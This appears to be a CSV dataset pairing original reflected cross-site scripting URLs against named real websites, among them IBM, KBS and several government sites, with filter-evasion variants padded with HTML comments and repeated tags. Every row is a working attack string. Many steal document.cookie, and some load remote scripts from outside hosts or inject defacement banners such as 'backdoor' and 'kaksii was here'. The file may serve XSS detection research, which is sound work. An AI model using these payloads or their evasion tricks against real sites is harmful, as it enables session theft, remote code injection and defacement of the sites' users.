Payloads,Original
http://www.livrariasaraiva.com.br/pesquisaweb/pesquisaweb.dll/pesquisa?id=c8cf50747d801110a02300217&amp;<br<!--Comment--<!--Comment-->><br<!--Comment--><!--Comment--><br<!--Comment--><!--Comment--><br<!-<!--Comment-->-Comment--><br<!--Comment--><!--Comment--><br<!--Comment--<!--Comment-->><br<!-<!--Comment-->-Comment--><br<!--Comment--><!--Comment-->><br<!-<!--Comment-->-Comment--><br<!--Comment--<!--Comment-->><br<!--Comment--<!--Comment-->><br<!-<!--Comment-->-Comment--><br<!-<!--Comment-->-Comment--><br<!--Comment--<!--Comment-->><br<!--Comment--><!--Comment--><br<!--Comment--<!--Comment-->>>filtron1=x&amp;filtron2=&amp;estrutn1=0301&amp;palavrasn1=%3cscript+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3cscript+src%3dhttp%3a%2f%2f<br>mygot.110mb.com%2flol.js<!--Comment--><!--Comment-->%3e%3cscript+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3cscript+src%3dhttp%3a%2f%2f<br>mygot.110mb.com%2flol.js<!--Comment--<!--Comment-->>%3e%3cscript+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3c<!--Comment-->script+src%3dhttp%3a%2f%2f<br>mygot.110mb.com%2flol.js<!--Comment-->%3e%3cscript+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3cscript+src%3dhttp%3a%2f%2f<br>mygot.110mb.com%2flol.js<!--Comment--<!--Comment-->>%3e%3c<!--Comment-->script+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3cscript+src%3dhttp%3a%2f%2f<br>mygot.110mb.com%2flol.js<!--Comment-->%3e%3cscript+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3c<!--Comment-->script+src%3dhttp%3a%2f%2f<br>mygot.110mb.com%2flol.js<!--Comment-->%3e%3cscript+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3cscript+src%3dhttp%3a%2f%2f<br<!--Comment-->>mygot.110mb.com%2flol.js<!--Comment-->%3e%3c<!--Comment-->script+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3cscript+src%3dhttp%3a%2f%2f<br>mygot.110mb.com%2flol.js<!--Comment-->%3e%3cscript+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br<!--Comment-->>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3cscript+src%3dhttp%3a%2f%2f<br<!--Comment-->>mygot.110mb.com%2flol.js%3e%3cscript+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br<!--Comment--<!--Comment-->>>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3cscript+src%3dhttp%3a%2f%2f<br>mygot.110mb.com%2flol.js%3e%3c<!--Comment-->script+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br<!--Comment-->>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3cscript+src%3dhttp%3a%2f%2f<br>mygot.110mb.com%2flol.js%3e%3cscript+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br<!--Comment-->>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3c<!--Comment-->script+src%3dhttp%3a%2f%2f<br>mygot.110mb.com%2flol.js%3e%3cscript+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br<!--Comment-->>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3cscript+src%3dhttp%3a%2f%2f<br>mygot.110mb.com%2flol.js<!--Comment-->%3e%3cscript+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br<!--Comment-->>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3cscript+src%3dhttp%3a%2f%2f<br<!--Comment-->>mygot.110mb.com%2flol.js%3e%3cscript+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br<!--Comment-->>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3cscript+src%3dhttp%3a%2f%2f<br>mygot.110mb.com%2flol.js<!--Comment-->%3e%3cscript+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br<!--Comment-->>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3cscript+src%3dhttp%3a%2f%2f<br<!--Comment-->>mygot.110mb.com%2flol.js%3e&amp;palavrasn2a=&amp;serieaux=*-*&amp;palavrasn3a=,http://www.livrariasaraiva.com.br/pesquisaweb/pesquisaweb.dll/pesquisa?id=c8cf50747d801110a02300217&amp;<br>filtron1=x&amp;filtron2=&amp;estrutn1=0301&amp;palavrasn1=%3cscript+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3cscript+src%3dhttp%3a%2f%2f<br>mygot.110mb.com%2flol.js%3e&amp;palavrasn2a=&amp;serieaux=*-*&amp;palavrasn3a=
http://www.nativeponiesonline.co.uk/classads/signinform.php?msg=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;/sc<br<!--Comment-->>ript&gt;&lt;/sc<br<!--Comment-->>ript&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;<!--Comment-->marquee&gt;&lt;h1<!--Comment-->&gt;&lt;<!--Comment-->h1&gt;backdoor&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/marquee&gt;&lt;/marquee<!--Comment-->&gt;,http://www.nativeponiesonline.co.uk/classads/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;
http://kmwgallery.gohsphere.com/gallery/igallery.asp?d=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&gt;&lt;ma<br<!--Comment-->>rquee&gt;&lt;ma<br<!--Comment-->>rquee&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;by%20narcoticxs&lt;<!--Comment-->/h1&gt;&lt;/h1<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;,http://kmwgallery.gohsphere.com/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;
http://enclub.a-joho.net/pc/index.php?agid=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`/xss/`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,http://enclub.a-joho.net/pc/index.php?agid=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e
http://www.grisoft.cz/%22%3e%27%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`/xss%20by%20mygot_manoel/`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,http://www.grisoft.cz/%22%3e%27%3e%3cscript%3ealert(/xss%20by%20mygot_manoel/)%3c/script%3e
http://www.hundesalon-nikki.de/index.php?page=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->h1<br>&gt;&lt;<!--Comment-->h1<br>&gt;backdoor&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/marquee&gt;&lt;/marquee<!--Comment-->&gt;,http://www.hundesalon-nikki.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;
http://shp.ionpromotion.net/top.cgi?act=search&amp;word='%3e%22%3e'%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`%22xss%20by%20ku<br<!--Comment-->><br<!--Comment-->>somiso.com%22`%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e&amp;submit=%8c%9f%8d%f5,http://shp.ionpromotion.net/top.cgi?act=search&amp;word='%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20ku<br>somiso.com%22)%3c/script%3e&amp;submit=%8c%9f%8d%f5
http://www.okm.gov.hu/main.php?folderid=3&amp;iid=100&amp;ctag=search&amp;newsearch=true&amp;simplesearch=true&amp;searc<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>h=%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%281%29%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c<!--Comment-->%2ftextarea%3e%3c<!--Comment-->%2ftextarea%3e%3c<!--Comment-->%2ftextarea%3e%3c<!--Comment-->%2ftextarea%3e%3c<!--Comment-->%2ftextarea%3e%3c<!--Comment-->%2ftextarea%3e%3c<!--Comment-->%2ftextarea%3e%3c<!--Comment-->%2ftextarea%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%28%22kaksii_was_he<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>re%22%29%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%27kaksii_was_here%27%29%3balert%281%29%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%22%3c%2fhtml<!--Comment-->%3e%3c%2fhtml<!--Comment-->%3e%3c%2fhtml<!--Comment-->%3e%3c%2fhtml<!--Comment-->%3e%3c%2fhtml<!--Comment-->%3e%3c%2fhtml<!--Comment-->%3e%3c%2fhtml<!--Comment-->%3e%3c%2fhtml<!--Comment-->%3e%3<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>chtml%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%2810111%29%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->div%2520align%3dcenter%3e%3c<!--Comment-->div%2520align%3dcenter%3e%3c<!--Comment-->div%2520align%3dcenter%3e%3c<!--Comment-->div%2520align%3dcenter%3e%3c<!--Comment-->div%2520align%3dcenter%3e%3c<!--Comment-->div%2520align%3dcenter%3e%3c<!--Comment-->div%2520align%3dcenter%3e%3c<!--Comment-->div%2520align%3dcenter%3e%2520%3cfont%2520size<br>%3d4<!--Comment-->%3e%3cfont%2520size<br>%3d4<!--Comment-->%3e%3cfont%2520size<br>%3d4<!--Comment-->%3e%3cfont%2520size<br>%3d4<!--Comment-->%3e%3cfont%2520size<br<!--Comment-->>%3d4%3e%3cfont%2520size<br<!--Comment-->>%3d4%3e%3cfont%2520size<br<!--Comment-->>%3d4%3e%3cfont%2520size<br<!--Comment-->>%3d4%3e%3c<!--Comment-->textarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3e%3c<!--Comment-->textarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3e%3c<!--Comment-->textarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3e%3c<!--Comment-->textarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3e%3c<!--Comment-->textarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3e%3c<!--Comment-->textarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3e%3c<!--Comment-->textarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3e%3c<!--Comment-->textarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3ekaksii%2520was%2520h<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>ere%3c%2ftextarea<!--Comment-->%3e%3c%2ftextarea<!--Comment-->%3e%3c%2ftextarea<!--Comment-->%3e%3c%2ftextarea<!--Comment-->%3e%3c%2ftextarea<!--Comment-->%3e%3c%2ftextarea<!--Comment-->%3e%3c%2ftextarea<!--Comment-->%3e%3c%2ftextarea<!--Comment-->%3e%3c<!--Comment-->%2ffont%3e%3c<!--Comment-->%2ffont%3e%3c<!--Comment-->%2ffont%3e%3c<!--Comment-->%2ffont%3e%3c<!--Comment-->%2ffont%3e%3c<!--Comment-->%2ffont%3e%3c<!--Comment-->%2ffont%3e%3c<!--Comment-->%2ffont%3e%3c<!--Comment-->%2fdiv%3e%3c<!--Comment-->%2fdiv%3e%3c<!--Comment-->%2fdiv%3e%3c<!--Comment-->%2fdiv%3e%3c%2fdiv<!--Comment-->%3e%3c%2fdiv<!--Comment-->%3e%3c%2fdiv<!--Comment-->%3e%3c%2fdiv<!--Comment-->%3e%3c<!--Comment-->noscript%3e%3c<!--Comment-->noscript%3e%3c<!--Comment-->noscript%3e%3c<!--Comment-->noscript%3e%3cnoscript<!--Comment-->%3e%3cnoscript<!--Comment-->%3e%3cnoscript<!--Comment-->%3e%3cnoscript<!--Comment-->%3e%3c<!--Comment-->plaintext%3e%3c<!--Comment-->plaintext%3e%3c<!--Comment-->plaintext%3e%3c<!--Comment-->plaintext%3e%3cplaintext<!--Comment-->%3e%3cplaintext<!--Comment-->%3e%3cplaintext<!--Comment-->%3e%3cplaintext<!--Comment-->%3e&amp;c_searchbox_submit=ok,http://www.okm.gov.hu/main.php?folderid=3&amp;iid=100&amp;ctag=search&amp;newsearch=true&amp;simplesearch=true&amp;searc<br>h=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaksii_was_he<br>re%22%29%3cscript%3ealert%28%27kaksii_was_here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3<br>chtml%3e%3cscript%3ealert%2810111%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520size<br>%3d4%3e%3ctextarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3ekaksii%2520was%2520h<br>ere%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;c_searchbox_submit=ok
http://www-307.ibm.com/pc/support/site.wss/document.do?lndocid=m%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3c<!--Comment-->iframe%20src=http://xssed.com%3e%3c<!--Comment-->iframe%20src=http://xssed.com%3e%3c<!--Comment-->iframe%20src=http://xssed.com%3e%3c<!--Comment-->iframe%20src=http://xssed.com%3e%3c<!--Comment-->iframe%20src=http://xssed.com%3e%3c<!--Comment-->iframe%20src=http://xssed.com%3e%3c<!--Comment-->iframe%20src=http://xssed.com%3e%3c<!--Comment-->iframe%20src=http://xssed.com%3e,http://www-307.ibm.com/pc/support/site.wss/document.do?lndocid=m%3ciframe%20src=http://xssed.com%3e
http://www.ylepb.gov.tw/info/profile4.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][]<br<!--Comment-->><br<!--Comment-->>[][][][][][][][][]=%22%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3ealert`document.cookie`%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,http://www.ylepb.gov.tw/info/profile4.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][]<br>[][][][][][][][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3c/script%3e
http://www.schoener-reisen.at/cms/index.php?page=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`&lt;<!--Comment-->/script&gt;&lt;/script<!--Comment-->&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;<!--Comment-->marquee&gt;<br<!--Comment-->><br<!--Comment-->>&lt;h1<!--Comment-->&gt;&lt;<!--Comment-->h1&gt;backdoor&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/marquee&gt;&lt;/marquee<!--Comment-->&gt;,http://www.schoener-reisen.at/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;
http://www.almeirim.pt/catalogo/indexres.asp?base=isbd&amp;prefix=&amp;indexkey==376-8716.&amp;maxtrm=20&amp;trmcols<br<!--Comment-->><br<!--Comment-->>=2&amp;form=comp&amp;recpag=5&amp;navdirection=0&amp;addtermo=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;,http://www.almeirim.pt/catalogo/indexres.asp?base=isbd&amp;prefix=&amp;indexkey==376-8716.&amp;maxtrm=20&amp;trmcols<br>=2&amp;form=comp&amp;recpag=5&amp;navdirection=0&amp;addtermo=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
http://english.kbs.co.kr/news/search_news.php?searchword=%22%3e'%3e%22%3c'%3c<!--Comment-->%3cscript%3e%3c'%3c<!--Comment-->%3cscript%3e%3c'%3c<!--Comment-->%3cscript%3e%3c'%3c<!--Comment-->%3cscript%3e%3c'%3c<!--Comment-->%3cscript%3e%3c'%3c<!--Comment-->%3cscript%3e%3c'%3c<!--Comment-->%3cscript%3e%3c'%3c<!--Comment-->%3cscript%3e%3c'%3c<!--Comment-->%3cscript%3e%3c'%3c<!--Comment-->%3cscript%3e%3c'%3c<!--Comment-->%3cscript%3e%3c'%3c<!--Comment-->%3cscript%3e%3c'%3c<!--Comment-->%3cscript%3e%3c'%3c<!--Comment-->%3cscript%3e%3c'%3c<!--Comment-->%3cscript%3e%3c'%3c<!--Comment-->%3cscript%3e%3c/script%<br<!--Comment-->>3e'%%3c'%3e%3c/script%<br<!--Comment-->>3e'%%3c'%3e%3c/script%<br<!--Comment-->>3e'%%3c'%3e%3c/script%<br<!--Comment-->>3e'%%3c'%3e%3c/script%<br<!--Comment-->>3e'%%3c'%3e%3c/script%<br<!--Comment-->>3e'%%3c'%3e%3c/script%<br<!--Comment-->>3e'%%3c'%3e%3c/script%<br<!--Comment-->>3e'%%3c'%3e%3c/script%<br<!--Comment-->>3e'%%3c'%3e%3c/script%<br<!--Comment-->>3e'%%3c'%3e%3c/script%<br<!--Comment-->>3e'%%3c'%3e%3c/script%<br<!--Comment-->>3e'%%3c'%3e%3c/script%<br<!--Comment-->>3e'%%3c'%3e%3c/script%<br<!--Comment-->>3e'%%3c'%3e%3c/script%<br<!--Comment-->>3e'%%3c'%3e%3c/script%<br<!--Comment-->>3e'%%3c'%3e%22%3e%3c<!--Comment-->script/src=http://kusomiso.com/xss.js%3e%3c<!--Comment-->script/src=http://kusomiso.com/xss.js%3e%3c<!--Comment-->script/src=http://kusomiso.com/xss.js%3e%3c<!--Comment-->script/src=http://kusomiso.com/xss.js%3e%3c<!--Comment-->script/src=http://kusomiso.com/xss.js%3e%3c<!--Comment-->script/src=http://kusomiso.com/xss.js%3e%3c<!--Comment-->script/src=http://kusomiso.com/xss.js%3e%3c<!--Comment-->script/src=http://kusomiso.com/xss.js%3e%3c<!--Comment-->script/src=http://kusomiso.com/xss.js%3e%3c<!--Comment-->script/src=http://kusomiso.com/xss.js%3e%3c<!--Comment-->script/src=http://kusomiso.com/xss.js%3e%3c<!--Comment-->script/src=http://kusomiso.com/xss.js%3e%3c<!--Comment-->script/src=http://kusomiso.com/xss.js%3e%3c<!--Comment-->script/src=http://kusomiso.com/xss.js%3e%3c<!--Comment-->script/src=http://kusomiso.com/xss.js%3e%3c<!--Comment-->script/src=http://kusomiso.com/xss.js%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,http://english.kbs.co.kr/news/search_news.php?searchword=%22%3e'%3e%22%3c'%3c%3cscript%3e%3c/script%<br>3e'%%3c'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e
http://www.munyie.com/search.php?keywords=%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%22xssed%20by%20./r14nul%22%29%3c<!--Comment-->/scri<br>pt%3e%3c<!--Comment-->/scri<br>pt%3e%3c<!--Comment-->/scri<br>pt%3e%3c<!--Comment-->/scri<br>pt%3e%3c<!--Comment-->/scri<br>pt%3e%3c<!--Comment-->/scri<br>pt%3e%3c<!--Comment-->/scri<br>pt%3e%3c<!--Comment-->/scri<br>pt%3e%3c/scri<br<!--Comment-->>pt%3e%3c/scri<br<!--Comment-->>pt%3e%3c/scri<br<!--Comment-->>pt%3e%3c/scri<br<!--Comment-->>pt%3e%3c/scri<br<!--Comment-->>pt%3e%3c/scri<br<!--Comment-->>pt%3e%3c/scri<br<!--Comment-->>pt%3e%3c/scri<br<!--Comment-->>pt%3e,http://www.munyie.com/search.php?keywords=%3cscript%3ealert%28%22xssed%20by%20./r14nul%22%29%3c/scri<br>pt%3e
